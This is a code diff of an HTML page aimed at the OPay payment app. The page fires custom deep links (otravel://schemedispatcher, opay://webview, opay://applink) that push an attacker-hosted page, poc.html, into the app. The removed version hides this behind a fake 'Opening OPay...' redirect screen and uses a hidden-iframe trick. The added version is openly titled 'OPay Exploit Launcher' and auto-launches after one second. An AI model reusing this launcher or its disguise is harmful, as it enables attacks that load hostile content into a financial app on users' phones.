@@ -4,154 +4,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>OPay Launcher</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            color: #333;
-        }
-
-        .container {
+            font-family: sans-serif;
+            padding: 20px;
             text-align: center;
-            padding: 40px 20px;
+            background: #f0f0f0;
         }
 
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #ddd;
-            border-top-color: #00c853;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .msg {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 10px;
-        }
-
-        .sub {
-            font-size: 13px;
-            color: #999;
-        }
-
-        .fallback {
-            display: none;
-            margin-top: 30px;
-        }
-
-        .fallback a {
-            display: inline-block;
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
             background: #00c853;
-            color: #fff;
-            padding: 14px 36px;
-            border-radius: 28px;
-            font-size: 16px;
-            font-weight: 600;
+            color: white;
             text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
         }
 
-        .fallback a:active {
-            transform: scale(0.97);
+        .btn.secondary {
+            background: #555;
+            font-size: 14px;
+        }
+
+        .status {
+            margin-bottom: 20px;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .small {
+            font-size: 12px;
+            color: #777;
+            margin-top: 30px;
         }
     </style>
 </head>
 
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <div class="msg">Opening OPay...</div>
-        <div class="sub">Please wait while we redirect you.</div>
-        <div class="fallback" id="fallback">
-            <p class="msg" style="margin-bottom:16px;">Tap below to open OPay</p>
-            <a id="manualBtn" href="#">Open OPay</a>
-        </div>
-    </div>
+    <h3>OPay Exploit Launcher</h3>
+    <div class="status" id="status">Select a launch method:</div>
+
+    <a id="btnA" class="btn" href="#" onclick="setStatus('Launching Method A...')">Method A (Standard)</a>
+    <a id="btnB" class="btn secondary" href="#" onclick="setStatus('Launching Method B...')">Method B (WebView)</a>
+    <a id="btnC" class="btn secondary" href="#" onclick="setStatus('Launching Method C...')">Method C (AppLink)</a>
+
+    <div class="small">payload: poc.html</div>
 
     <script>
-        // Dynamic payload URL based on current location
-        var base = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
-        var PAYLOAD_URL = base + "poc.html";
+        var b = window.location.href.split('?')[0].split('#')[0];
+        var base = b.substring(0, b.lastIndexOf('/') + 1);
+        var PAYLOAD = base + "poc.html";
 
-        // Deep link schemes to try (in order)
-        var SCHEMES = [
-            "otravel://schemedispatcher?action=" + PAYLOAD_URL,
-            "opay://webview?url=" + encodeURIComponent(PAYLOAD_URL),
-            "opay://applink?url=" + encodeURIComponent(PAYLOAD_URL)
-        ];
+        // Define schemes
+        var A = "otravel://schemedispatcher?action=" + PAYLOAD;
+        var B = "opay://webview?url=" + encodeURIComponent(PAYLOAD);
+        var C = "opay://applink?url=" + encodeURIComponent(PAYLOAD);
 
-        var currentScheme = 0;
-        var launched = false;
+        document.getElementById("btnA").href = A;
+        document.getElementById("btnB").href = B;
+        document.getElementById("btnC").href = C;
 
-        function tryLaunch() {
-            if (launched || currentScheme >= SCHEMES.length) return;
-
-            var deepLink = SCHEMES[currentScheme];
-
-            // Method 1: iframe trick (bypasses some iOS restrictions)
-            try {
-                var iframe = document.createElement("iframe");
-                iframe.style.display = "none";
-                iframe.src = deepLink;
-                document.body.appendChild(iframe);
-                setTimeout(function () {
-                    try { document.body.removeChild(iframe); } catch (e) { }
-                }, 500);
-            } catch (e) { }
-
-            // Method 2: direct location (primary for iOS Safari)
-            setTimeout(function () {
-                try {
-                    window.location.href = deepLink;
-                } catch (e) { }
-            }, 100);
-
-            launched = true;
+        function setStatus(msg) {
+            document.getElementById("status").innerText = msg;
         }
 
-        // Set manual fallback button
-        document.getElementById("manualBtn").href = SCHEMES[0];
-
-        // Show fallback button after 3 seconds if still on page
+        // Auto-launch Method A after 1s
         setTimeout(function () {
-            document.getElementById("fallback").style.display = "block";
-        }, 3000);
-
-        // Auto-launch immediately
-        tryLaunch();
-
-        // Track visibility — if page is hidden, app likely opened
-        document.addEventListener("visibilitychange", function () {
-            if (document.hidden) { launched = true; }
-        });
-
-        // If still visible after 2s, try next scheme
-        setTimeout(function () {
-            if (!document.hidden && SCHEMES.length > 1) {
-                currentScheme = 1;
-                launched = false;
-                tryLaunch();
-            }
-        }, 2000);
+            setStatus("Auto-launching Method A...");
+            window.location.href = A;
+        }, 1000);
     </script>
 </body>
 
